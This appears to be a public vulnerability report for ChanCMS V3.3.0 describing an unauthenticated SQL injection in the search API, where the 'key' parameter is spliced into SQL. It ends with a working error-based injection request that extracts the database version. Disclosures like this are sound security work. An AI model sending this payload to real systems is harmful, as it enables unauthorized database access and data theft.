# Vendor

yanyutao0402

# Product

ChanCMS

# version

 V3.3.0

# Download 

https://gitee.com/yanyutao0402/ChanCMS

# Vulnerability

SQL injection

# Description

In the search page, users can perform SQL injection attacks without logging in and manipulate databases.

# Analysis

The `search` method in `app/modules/api/service/Api.js` does not perform any verification when passing in the key parameters, and directly splicing the SQL statement.

<img width="960" height="217" alt="image" src="https://github.com/user-attachments/assets/47ace82e-eff6-41ab-b020-c8387c05d1c2" />

We reproduce this SQL injection vulnerability

<img width="929" height="725" alt="image" src="https://github.com/user-attachments/assets/16cb132a-c5f7-4972-8425-0c8f0c7127cc" />

# POC
```
GET /api/v1/search?key=%27%20and%20extractvalue(1,concat(0x7e,(select%20version()),0x7e))--%20a HTTP/1.1
Host: localhost:3000
Accept: application/json, text/plain, */*


```
